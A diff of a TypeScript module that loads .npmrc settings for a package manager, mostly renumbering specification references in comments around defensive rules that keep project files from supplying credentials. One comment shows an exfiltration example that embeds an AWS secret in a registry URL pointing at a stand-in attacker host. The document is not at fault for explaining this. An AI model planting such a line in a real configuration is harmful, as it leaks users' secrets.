@@ -18,7 +18,7 @@ import {
 import { DEFAULT_REGISTRY } from "../config/keys.ts";
 import { advisory } from "../errors.ts";
 import { loadEnvFileFrom } from "../project/env.ts";
-/** §15.1's three tiers, lowest precedence first. */
+/** §05.3's three tiers, lowest precedence first. */
 export type NpmrcLevel = "global" | "user" | "project";
 
 /** Which file, and which key in it, a setting came from. */
@@ -30,14 +30,14 @@ export interface NpmrcOrigin {
 }
 
 /**
- * Who chose the registry a request is about to be sent to — §15.1's three tiers
- * and §15.2's variables collapsed to the one distinction that decides whether a
+ * Who chose the registry a request is about to be sent to — §05.3's three tiers
+ * and §05.2's variables collapsed to the one distinction that decides whether a
  * credential may ride along.
  *
  * `"project"` means the effective origin was named by a source that lives
  * **inside the repository**: a project-level `.npmrc`'s `registry` /
- * `@scope:registry`, or a `.jup.env` that set one of §15.2's registry
- * variables. §15.37 deliberately keeps those variables project-settable, on the
+ * `@scope:registry`, or a `.jup.env` that set one of §05.2's registry
+ * variables. §11.2 deliberately keeps those variables project-settable, on the
  * reasoning that redirecting a *download* is a project's own business — but the
  * user's `COREPACK_NPM_TOKEN` is not the project's business. Separating registry
  * selection from credential authority lets the registry move without exposing
@@ -57,13 +57,13 @@ export interface NpmrcAuthEntry {
   origin: NpmrcOrigin;
 }
 
-/** What one file contributed, for `jup info` (§15.30). */
+/** What one file contributed, for `jup info` (§09.9). */
 export interface NpmrcFileReport {
   path: string;
   level: NpmrcLevel;
   /** Honoured keys, in the order they appear in the file. */
   keys: string[];
-  /** Keys refused because a project-level file may not supply them (§15.1). */
+  /** Keys refused because a project-level file may not supply them (§05.3). */
   refused: string[];
 }
 
@@ -101,12 +101,12 @@ export interface NpmrcConfig {
 }
 /**
  * This module keeps its own strings, as `info.ts`, `shims.ts` and `tls.ts` do.
- * Neither is in §12's normative table: §15.1 prescribes the behaviour and leaves
+ * Neither is in §12's normative table: §05.3 prescribes the behaviour and leaves
  * the wording open, and the shape follows `messages.ignoringEnvVar` so the two
  * refusals read alike.
  */
 export const npmrcMessages = {
-  /** §15.1 — a project file tried to supply auth or TLS. Say so; do not just drop it. */
+  /** §05.3 — a project file tried to supply auth or TLS. Say so; do not just drop it. */
   refusedProjectKey: (key: string, path: string) =>
     `! Ignoring ${key} from ${path}: a project-level .npmrc may only set registry and @scope:registry`,
 
@@ -117,7 +117,7 @@ export const npmrcMessages = {
   /**
    * A project-level file tried to expand `${VAR}`.
    *
-   * §15.1 already refuses every project key but `registry` and
+   * §05.3 already refuses every project key but `registry` and
    * `@scope:registry`, which leaves expansion as the last way a cloned
    * repository could read the environment it is running in — and it does not
    * merely read it, it *sends* it: `registry=https://evil.example/${AWS_SECRET}`
@@ -155,7 +155,7 @@ export function resetNpmrcCache(): void {
   warned.clear();
 }
 /**
- * Keys a **project-level** file may set. Everything else in §15.1's table is a
+ * Keys a **project-level** file may set. Everything else in §05.3's table is a
  * trust decision, and a cloned repository does not get to make it.
  */
 function isProjectSafeKey(key: string): boolean {
@@ -185,11 +185,11 @@ export function globalNpmrcPath(): string {
 }
 
 /**
- * The home directory, as §15.1 spells it: `$HOME`, or `%USERPROFILE%` on
+ * The home directory, as §05.3 spells it: `$HOME`, or `%USERPROFILE%` on
  * Windows.
  *
  * The environment variable is read *first*, and `os.homedir()` is only the
- * fallback. §15.1 names the variables, and on a worker thread — which is where
+ * fallback. §05.3 names the variables, and on a worker thread — which is where
  * this module's own tests run — `os.homedir()` consults the real process
  * environment rather than `process.env`, so a test that redirects `HOME` would
  * otherwise be silently ignored and every home-directory rule would go
@@ -217,11 +217,11 @@ export function userNpmrcPath(): string | undefined {
  * dependency cannot supply one; the walk stops at the manifest that declares
  * `packageManager` (the project root), and never climbs into the user's home
  * directory, whose `.npmrc` is the **user** file and must not be reclassified as
- * project-level — that distinction is the whole of §15.1's security rule.
+ * project-level — that distinction is the whole of §05.3's security rule.
  *
  * The env file is collected on the same climb, for {@link registryTrustFor}'s
  * sake: it is the other thing inside a repository that can name a registry
- * (§15.37), and answering "who chose this origin" needs both halves. Only the
+ * (§11.2), and answering "who chose this origin" needs both halves. Only the
  * *closest* one is taken, exactly as §03.2 and `manifest.ts` apply it. That
  * costs at most two extra `openat` calls per walked directory, all of them on
  * this module's already-cold, already-memoised path — §01.3 measures the warm
@@ -347,7 +347,7 @@ function unquote(value: string): string {
 }
 
 /**
- * npm's `${VAR}` expansion, applied **only** to the keys §15.1 honours.
+ * npm's `${VAR}` expansion, applied **only** to the keys §05.3 honours.
  *
  * A reference the environment does not define returns `undefined`, and the
  * caller drops the key: npm errors out, and the one thing that must not happen
@@ -376,10 +376,10 @@ export function expandVariables(value: string): { value: string } | { missing: s
 }
 const cache = new Map<string, NpmrcConfig>();
 
-/** The auth key suffixes §15.1 lists, and nothing else. */
+/** The auth key suffixes §05.3 lists, and nothing else. */
 const AUTH_SUFFIXES = [":_authToken", ":_auth", ":username", ":_password"] as const;
 
-/** §15.1's TLS keys, honoured from the user and global files only. */
+/** §05.3's TLS keys, honoured from the user and global files only. */
 const TLS_KEYS = new Set(["cafile", "ca", "strict-ssl"]);
 
 function authSuffixOf(key: string): (typeof AUTH_SUFFIXES)[number] | undefined {
@@ -387,7 +387,7 @@ function authSuffixOf(key: string): (typeof AUTH_SUFFIXES)[number] | undefined {
   return AUTH_SUFFIXES.find((suffix) => key.endsWith(suffix));
 }
 
-/** Is this a key §15.1 lists at all? Everything else is ignored outright. */
+/** Is this a key §05.3 lists at all? Everything else is ignored outright. */
 function isHonouredKey(key: string): boolean {
   return (
     key === "registry" ||
@@ -398,7 +398,7 @@ function isHonouredKey(key: string): boolean {
 }
 
 /**
- * Read every `.npmrc` that applies, in §15.1's order, and fold them into one
+ * Read every `.npmrc` that applies, in §05.3's order, and fold them into one
  * decision per setting.
  *
  * Memoised per working directory: a run makes several requests and each asks
@@ -421,7 +421,7 @@ export function loadNpmrc(cwd: string = process.cwd()): NpmrcConfig {
 
   // Lowest precedence first, so a later file simply overwrites: global, user,
   // then the project files from the *outermost* inward, leaving the closest one
-  // — §15.1's "closest wins" — applied last.
+  // — §05.3's "closest wins" — applied last.
   const sources: Array<{ path: string; level: NpmrcLevel }> = [
     { path: globalNpmrcPath(), level: "global" },
   ];
@@ -460,7 +460,7 @@ export function loadNpmrc(cwd: string = process.cwd()): NpmrcConfig {
         continue;
       }
 
-      // The second half of the security rule, and the half §15.1 does not state.
+      // The second half of the security rule, and the half §05.3 does not state.
       // Refusing the *keys* a project may not set still leaves `registry` — the
       // one it may — able to read the whole environment through `${VAR}` and put
       // what it reads on the wire. See `npmrcMessages.refusedProjectExpansion`.
@@ -499,7 +499,7 @@ export function loadNpmrc(cwd: string = process.cwd()): NpmrcConfig {
   }
 
   finishBasicAuth(config, basic);
-  // Longest prefix first: the first match is the most specific one (§15.1).
+  // Longest prefix first: the first match is the most specific one (§05.3).
   config.auth.sort((a, b) => b.prefix.length - a.prefix.length);
 
   cache.set(key, config);
@@ -582,7 +582,7 @@ function setAuth(config: NpmrcConfig, entry: NpmrcAuthEntry): void {
   else config.auth[existing] = entry;
 }
 
-/** §15.1's file tiers, lowest first. A later file outranks an earlier one. */
+/** §05.3's file tiers, lowest first. A later file outranks an earlier one. */
 const LEVEL_RANK: Record<NpmrcLevel, number> = { global: 0, user: 1, project: 2 };
 
 /** `username` + `_password` only become a credential once both halves are in. */
@@ -680,7 +680,7 @@ function normalisePrefix(raw: string): string | undefined {
   return `//${host.toLowerCase()}${path}/`;
 }
 /**
- * §15.1 — the credential for this URL, or `undefined`.
+ * §05.3 — the credential for this URL, or `undefined`.
  *
  * "A credential MUST only be attached to a request whose origin *and* path
  * prefix match." The scheme is deliberately **not** compared, which is npm's
@@ -700,7 +700,7 @@ export function npmrcAuthorizationFor(
     (entry) => target.startsWith(entry.prefix) || `${target}/` === entry.prefix,
   );
 }
-/** Where an effective registry setting came from, for `jup info` (§15.30). */
+/** Where an effective registry setting came from, for `jup info` (§09.9). */
 export interface RegistryDecision {
   /** The base URL, trailing slashes stripped (§05.2). */
   registry: string;
@@ -711,7 +711,7 @@ export interface RegistryDecision {
   origin?: NpmrcOrigin;
   /**
    * Whether the user's own configuration chose this registry, or the repository
-   * did (§14.6, §15.37). `credentialsFor` gates the environment credential tier
+   * did (§05.1, §11.2). `credentialsFor` gates the environment credential tier
    * on it, and the plaintext floor on it as well.
    */
   trust: RegistryTrust;
@@ -804,7 +804,7 @@ function scopeOf(packageName: string | undefined): string | undefined {
 }
 
 /**
- * §15.1 + §15.2's precedence, in one place:
+ * §05.3 + §05.2's precedence, in one place:
  *
  * ```
  * 1. COREPACK_REGISTRY_<NAME>                       per package manager
@@ -820,7 +820,7 @@ function scopeOf(packageName: string | undefined): string | undefined {
  * @param name The package manager the request is for, when there is one. Tier 1
  * is skipped without it.
  * @param packageName The npm package being fetched, when there is one. Tier 3's
- * scoped lookup needs it: §15.38 row 150 turns on `@yarnpkg:registry` alone.
+ * scoped lookup needs it: `@yarnpkg:registry` alone turns it on (§05.3).
  */
 export function resolveRegistry(options?: {
   name?: string;
@@ -887,7 +887,7 @@ export function npmProtocolRegistry(options?: {
     source: `.npmrc ${chosen.origin.key} (${chosen.origin.path})`,
     kind: "npmrc",
     origin: chosen.origin,
-    // The file's own level *is* the trust tier: §15.1 already refuses every
+    // The file's own level *is* the trust tier: §05.3 already refuses every
     // other key from a project file, and `registry` is the one it lets through.
     trust: chosen.origin.level === "project" ? "project" : "user",
   };
@@ -896,7 +896,7 @@ export function npmProtocolRegistry(options?: {
 /** The origin of the registry that ships with the binary; nothing can move it. */
 const DEFAULT_REGISTRY_ORIGIN = new URL(DEFAULT_REGISTRY).origin;
 
-/** §15.2's variables, both spellings, without needing to know the tool names. */
+/** §05.2's variables, both spellings, without needing to know the tool names. */
 const REGISTRY_VARIABLE = /^(?:COREPACK|JUP)_(?:NPM_REGISTRY|REGISTRY_.+)$/;
 
 /**
@@ -933,7 +933,7 @@ function envRegistryOrigins(config: NpmrcConfig): { user: Set<string>; project: 
  * to hand: a tarball URL from `dist.tarball`, a redirect target, a test's local
  * server. Under an allow-list every one of those would silently lose its
  * credentials, which is a broken tool rather than a safe one — and the whole
- * point of §14.6 is that the answer must be legible.
+ * point of §05.1 is that the answer must be legible.
  *
  * So the rule states the hazard instead: an origin is `"project"` when a source
  * inside the repository named it **and** the user's own configuration did not.
